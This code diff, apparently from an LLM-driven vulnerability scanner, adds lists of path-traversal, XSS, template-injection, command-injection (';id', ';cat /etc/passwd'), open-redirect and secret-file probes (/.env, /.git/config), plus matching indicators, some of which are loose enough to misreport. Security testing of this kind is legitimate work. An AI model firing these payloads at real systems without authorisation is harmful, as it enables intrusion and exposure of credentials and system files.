@@ -124,12 +124,49 @@ VERIFICATION_TOOLS: dict[str, list[dict]] = {
 }
 
 
+def _get_real_params_for_url(state: VulnHuntState, target_url: str) -> list[str]:
+    """
+    从 attack_surface 中查找与 target_url 关联的真实参数名。
+    优先精确匹配路径，退而求其次返回同域所有参数。
+    """
+    bb = state["blackboard"]
+    attack_surface = bb.attack_surface or {}
+    params_list = attack_surface.get("parameters", [])
+    forms_list = attack_surface.get("forms", [])
+
+    from urllib.parse import urlparse as _urlparse
+    target_path = _urlparse(target_url).path.rstrip("/")
+
+    # Exact match params for this path
+    matched = []
+    for p in params_list:
+        p_url = p.get("url", "")
+        p_path = _urlparse(p_url).path.rstrip("/") if p_url.startswith("http") else p_url.rstrip("/")
+        if p_path == target_path:
+            matched.append(p.get("name", ""))
+
+    # Check forms
+    for f in forms_list:
+        action = f.get("action", "")
+        action_path = action.rstrip("/") if not action.startswith("http") else _urlparse(action).path.rstrip("/")
+        if action_path == target_path:
+            matched.extend(f.get("params", []))
+
+    if matched:
+        return list(dict.fromkeys(matched))  # dedupe preserving order
+
+    # Fallback: return all known params (for generic testing)
+    all_params = [p.get("name", "") for p in params_list]
+    all_params.extend(pn for f in forms_list for pn in f.get("params", []))
+    return list(dict.fromkeys(all_params))[:5]
+
+
 async def _verify_with_tools(hyp, context: ExecutionContext, state: VulnHuntState) -> dict:
     """
     使用工具对假设进行实际验证
 
-    根据假设类型选择合适的工具执行，返回工具验证结果。
-    对于使用 http_request 的通用类型，构造特定 payload 探测。
+    根据假设类型选择合适的工具执行，支持多 payload 变体探测。
+    对于 http_request 通用类型，尝试多个 payload 直到确认或全部失败。
 
     Returns:
         {tool_used: str, tool_result: dict, tool_verified: bool}
@@ -168,78 +205,231 @@ async def _verify_with_tools(hyp, context: ExecutionContext, state: VulnHuntStat
     # 依次尝试推荐的工具
     for cfg in tool_configs:
         tool_name = cfg["tool"]
-        params = {cfg["param_key"]: target_url}
 
-        # 为专用工具添加额外参数
-        if tool_name == "sqli_detect" and hyp.trigger_path and len(hyp.trigger_path) > 1:
-            params["parameter"] = hyp.trigger_path[1]
+        # 专用工具（sqli_detect, ssrf_detect, auth_test）走单次调用
+        if tool_name != "http_request":
+            params = {cfg["param_key"]: target_url}
 
-        # 为 http_request 构造类型特定的探测请求
-        if tool_name == "http_request":
-            params = _build_http_probe_params(vuln_type, target_url, hyp)
+            if tool_name == "sqli_detect":
+                # sqli_detect requires "param" (the parameter name to inject into)
+                # and "url" should be the base URL without query string
+                from urllib.parse import parse_qs, urlparse as _urlparse
+                _parsed = _urlparse(target_url)
+                # Strip query string from URL for sqli_detect (it builds its own params)
+                clean_url = f"{_parsed.scheme}://{_parsed.netloc}{_parsed.path}"
+                params["url"] = clean_url
 
-        result = await _run_tool(tool_name, params, context)
+                if hyp.trigger_path and len(hyp.trigger_path) > 1:
+                    params["param"] = hyp.trigger_path[1]
+                else:
+                    # Try to extract param from URL query string
+                    _qs = parse_qs(_parsed.query)
+                    if _qs:
+                        params["param"] = next(iter(_qs))
+                    else:
+                        # No param to test — skip this tool
+                        continue
 
-        if result.get("success"):
-            vulnerable = _evaluate_tool_result(vuln_type, tool_name, result)
+            elif tool_name == "auth_test":
+                # auth_test requires user_a_token; use a dummy token for unauthenticated comparison
+                params["user_a_token"] = "dummy_test_token_12345"
+                params["no_auth"] = True
+
+            result = await _run_tool(tool_name, params, context)
+            if result.get("success"):
+                vulnerable = _evaluate_tool_result(vuln_type, tool_name, result)
+                return {
+                    "tool_used": tool_name,
+                    "tool_result": result,
+                    "tool_verified": vulnerable,
+                }
+            # Tool failed (connection error, whitelist block, etc.) — fall through to http_request
+            logger.warning("专用工具 %s 执行失败: %s, 尝试 http_request 降级", tool_name, result.get("error", ""))
+            # Use http_request as fallback for failed specialized tools
+            real_params = _get_real_params_for_url(state, target_url)
+            probes = _build_http_probe_list(vuln_type, target_url, hyp, real_params)
+            for probe_params in probes:
+                fallback_result = await _run_tool("http_request", probe_params, context)
+                if fallback_result.get("success"):
+                    vulnerable = _evaluate_tool_result(vuln_type, "http_request", fallback_result)
+                    if vulnerable:
+                        return {
+                            "tool_used": "http_request",
+                            "tool_result": fallback_result,
+                            "tool_verified": True,
+                        }
             return {
                 "tool_used": tool_name,
                 "tool_result": result,
-                "tool_verified": vulnerable,
+                "tool_verified": False,
+            }
+        else:
+            # http_request: 多 payload 变体探测
+            real_params = _get_real_params_for_url(state, target_url)
+            probes = _build_http_probe_list(vuln_type, target_url, hyp, real_params)
+            for probe_params in probes:
+                result = await _run_tool("http_request", probe_params, context)
+                if result.get("success"):
+                    vulnerable = _evaluate_tool_result(vuln_type, "http_request", result)
+                    if vulnerable:
+                        return {
+                            "tool_used": "http_request",
+                            "tool_result": result,
+                            "tool_verified": True,
+                        }
+            # 所有 probe 都未确认
+            return {
+                "tool_used": "http_request",
+                "tool_result": result if 'result' in dir() else None,
+                "tool_verified": False,
             }
 
     return {"tool_used": None, "tool_result": None, "tool_verified": False}
 
 
-def _build_http_probe_params(vuln_type: str, target_url: str, hyp) -> dict:
-    """为 http_request 工具构造针对特定漏洞类型的探测参数"""
-    params = {"url": target_url, "method": "GET", "follow_redirects": False}
+def _build_http_probe_list(vuln_type: str, target_url: str, hyp, real_params: list[str] = None) -> list[dict]:
+    """
+    为 http_request 工具构造多个探测参数变体。
+    每种漏洞类型返回 5-8 个不同 payload 变体以提高检出率。
+    real_params: 从 attack_surface 获取的真实参数名列表。
+    """
+    probes = []
+    base_params = {"method": "GET", "follow_redirects": False}
 
-    if vuln_type == "lfi" or vuln_type == "path_traversal":
-        separator = "&" if "?" in target_url else "?"
-        if "=" in target_url:
-            base, _ = target_url.rsplit("=", 1)
-            params["url"] = f"{base}=....//....//....//etc/passwd"
-        else:
-            params["url"] = f"{target_url}{separator}file=....//....//....//etc/passwd"
+    # Determine which parameter names to inject into
+    inject_params = real_params or []
+
+    def _inject(url: str, payload: str, param_name: str = None) -> str:
+        """Inject payload into URL. Use real param name if available."""
+        if "=" in url:
+            base, _ = url.rsplit("=", 1)
+            return f"{base}={payload}"
+        separator = "&" if "?" in url else "?"
+        if param_name:
+            return f"{url}{separator}{param_name}={payload}"
+        # Fallback param name by vuln type
+        fallback = "file" if vuln_type in ("lfi", "path_traversal") else "q"
+        return f"{url}{separator}{fallback}={payload}"
+
+    if vuln_type in ("lfi", "path_traversal"):
+        payloads = [
+            "....//....//....//etc/passwd",
+            "..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "....//....//....//....//etc/shadow",
+            "..\\..\\..\\..\\windows\\win.ini",
+            "/etc/passwd",
+            "....//....//....//proc/self/environ",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+        ]
+        params_to_try = inject_params if inject_params else [None]
+        for param_name in params_to_try:
+            for p in payloads:
+                probes.append({**base_params, "url": _inject(target_url, p, param_name)})
 
     elif vuln_type == "xss":
-        separator = "&" if "?" in target_url else "?"
-        if "=" in target_url:
-            base, _ = target_url.rsplit("=", 1)
-            params["url"] = f"{base}=<script>alert(1)</script>"
-        else:
-            params["url"] = f"{target_url}{separator}q=<script>alert(1)</script>"
+        payloads = [
+            "<script>alert(1)</script>",
+            "\"><img src=x onerror=alert(1)>",
+            "'-alert(1)-'",
+            "<svg/onload=alert(1)>",
+            "javascript:alert(1)//",
+            "<details/open/ontoggle=alert(1)>",
+            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        ]
+        params_to_try = inject_params if inject_params else [None]
+        for param_name in params_to_try:
+            for p in payloads:
+                probes.append({**base_params, "url": _inject(target_url, p, param_name)})
 
     elif vuln_type == "ssti":
-        separator = "&" if "?" in target_url else "?"
-        if "=" in target_url:
-            base, _ = target_url.rsplit("=", 1)
-            params["url"] = f"{base}=${{7*7}}"
-        else:
-            params["url"] = f"{target_url}{separator}name=${{7*7}}"
+        payloads = [
+            "${7*7}",
+            "{{7*7}}",
+            "#{7*7}",
+            "${7*'7'}",
+            "{{config}}",
+            "<%= 7*7 %>",
+            "{7*7}",
+        ]
+        params_to_try = inject_params if inject_params else [None]
+        for param_name in params_to_try:
+            for p in payloads:
+                probes.append({**base_params, "url": _inject(target_url, p, param_name)})
 
     elif vuln_type == "open_redirect":
+        payloads = [
+            "https://evil.com",
+            "//evil.com",
+            "/\\evil.com",
+            "https://evil.com%00",
+            "//evil%2ecom",
+        ]
         separator = "&" if "?" in target_url else "?"
-        params["url"] = f"{target_url}{separator}redirect=https://evil.com"
-
-    elif vuln_type == "info_disclosure":
-        pass
+        for param_name in ("redirect", "url", "next", "return_to", "goto"):
+            for p in payloads[:2]:
+                probes.append({**base_params, "url": f"{target_url}{separator}{param_name}={p}"})
 
     elif vuln_type == "rce":
-        separator = "&" if "?" in target_url else "?"
+        payloads = [
+            ";id",
+            "|id",
+            "$(id)",
+            "`id`",
+            ";cat /etc/passwd",
+            "|whoami",
+            "&&id",
+        ]
+        params_to_try = inject_params if inject_params else [None]
+        for param_name in params_to_try:
+            for p in payloads:
+                probes.append({**base_params, "url": _inject(target_url, p, param_name)})
+
+    elif vuln_type == "info_disclosure":
+        sensitive_paths = [
+            "/.env", "/.git/config", "/web.config", "/phpinfo.php",
+            "/server-status", "/.htaccess", "/wp-config.php.bak",
+            "/api/swagger.json", "/actuator/env", "/.DS_Store",
+        ]
+        bb_base = target_url.rstrip("/")
+        for sp in sensitive_paths:
+            probes.append({**base_params, "url": f"{bb_base}{sp}"})
+
+    elif vuln_type == "idor":
         if "=" in target_url:
             base, _ = target_url.rsplit("=", 1)
-            params["url"] = f"{base}=;id"
+            for test_id in ["1", "2", "0", "9999", "-1", "admin"]:
+                probes.append({**base_params, "url": f"{base}={test_id}"})
         else:
-            params["url"] = f"{target_url}{separator}cmd=id"
+            probes.append({**base_params, "url": target_url})
 
-    return params
+    elif vuln_type == "file_upload":
+        probes.append({**base_params, "url": target_url, "method": "POST"})
+
+    if not probes:
+        params_to_try = inject_params if inject_params else [None]
+        for param_name in params_to_try:
+            probes.append({**base_params, "url": _inject(target_url, "test", param_name)})
+
+    # Cap total probes to avoid excessive requests (max 20 per hypothesis)
+    return probes[:20]
+
+
+def _build_http_probe_params(vuln_type: str, target_url: str, hyp) -> dict:
+    """兼容接口：返回第一个 probe"""
+    probes = _build_http_probe_list(vuln_type, target_url, hyp, [])
+    return probes[0] if probes else {"url": target_url, "method": "GET", "follow_redirects": False}
 
 
 def _evaluate_tool_result(vuln_type: str, tool_name: str, result: dict) -> bool:
     """根据漏洞类型和工具结果判断是否确认漏洞"""
-    if tool_name != "http_request":
+    if tool_name == "auth_test":
+        return result.get("unauth_access", False) or result.get("idor_detected", False)
+
+    if tool_name == "sqli_detect":
+        return result.get("vulnerable", False)
+
+    if tool_name not in ("http_request",):
         return result.get("vulnerable", False) or result.get("found", False)
 
     body = result.get("body", "") or ""
@@ -247,26 +437,51 @@ def _evaluate_tool_result(vuln_type: str, tool_name: str, result: dict) -> bool:
     headers = result.get("headers", {}) or {}
 
     if vuln_type in ("lfi", "path_traversal"):
-        indicators = ["root:", "/bin/bash", "/bin/sh", "daemon:", "[boot loader]", "[extensions]"]
+        indicators = [
+            "root:", "/bin/bash", "/bin/sh", "daemon:", "nobody:",
+            "[boot loader]", "[extensions]", "[fonts]",
+            "DOCUMENT_ROOT", "/usr/sbin/nologin",
+        ]
         return any(ind in body for ind in indicators)
 
     elif vuln_type == "xss":
-        return "<script>alert(1)</script>" in body
+        xss_indicators = [
+            "<script>alert(1)</script>",
+            "onerror=alert(1)",
+            "<svg/onload=alert(1)>",
+            "ontoggle=alert(1)",
+            "<img src=x onerror=",
+        ]
+        return any(ind in body for ind in xss_indicators)
 
     elif vuln_type == "ssti":
-        return "49" in body and "${7*7}" not in body
+        ssti_confirmed = [
+            ("49" in body and "{{7*7}}" not in body and "${7*7}" not in body),
+            ("7777777" in body),
+            ("SECRET_KEY" in body or "DEBUG" in body),
+        ]
+        return any(ssti_confirmed)
 
     elif vuln_type == "open_redirect":
         location = headers.get("location", "") or headers.get("Location", "")
-        return "evil.com" in location or (status in (301, 302, 303, 307, 308) and "evil.com" in body)
+        return ("evil.com" in location or
+                (status in (301, 302, 303, 307, 308) and "evil.com" in (location or body)))
 
     elif vuln_type == "rce":
-        return "uid=" in body and "gid=" in body
+        rce_indicators = ["uid=", "gid=", "root:", "www-data", "whoami"]
+        return any(ind in body for ind in rce_indicators)
 
     elif vuln_type == "info_disclosure":
-        sensitive_patterns = ["password", "secret", "api_key", "token", "private_key",
-                            "phpinfo()", "DOCUMENT_ROOT", "SERVER_ADDR"]
-        return any(p.lower() in body.lower() for p in sensitive_patterns)
+        sensitive_patterns = [
+            "password", "secret", "api_key", "token", "private_key",
+            "phpinfo()", "DOCUMENT_ROOT", "SERVER_ADDR", "DB_PASSWORD",
+            "AWS_SECRET", "MYSQL_PASSWORD", "[core]", "repositoryformatversion",
+        ]
+        return (any(p.lower() in body.lower() for p in sensitive_patterns) and
+                status == 200 and len(body) > 20)
+
+    elif vuln_type == "idor":
+        return status == 200 and len(body) > 50
 
     return False
 
@@ -391,8 +606,9 @@ async def verifier_node(state: VulnHuntState) -> dict:
         response_text = await llm.call(agent="verifier", messages=messages)
         result = _parse_verifier_response(response_text)
 
-        # 最终判断: 工具确认 OR LLM 判断
-        verified = tool_result["tool_verified"] or result.get("verified", False)
+        # 最终判断: 必须有工具证据才能确认漏洞
+        # LLM 只用于补充分析（severity、reproduction_steps），不能单独确认
+        verified = tool_result["tool_verified"]
         severity = result.get("severity", "low")
 
         if verified:
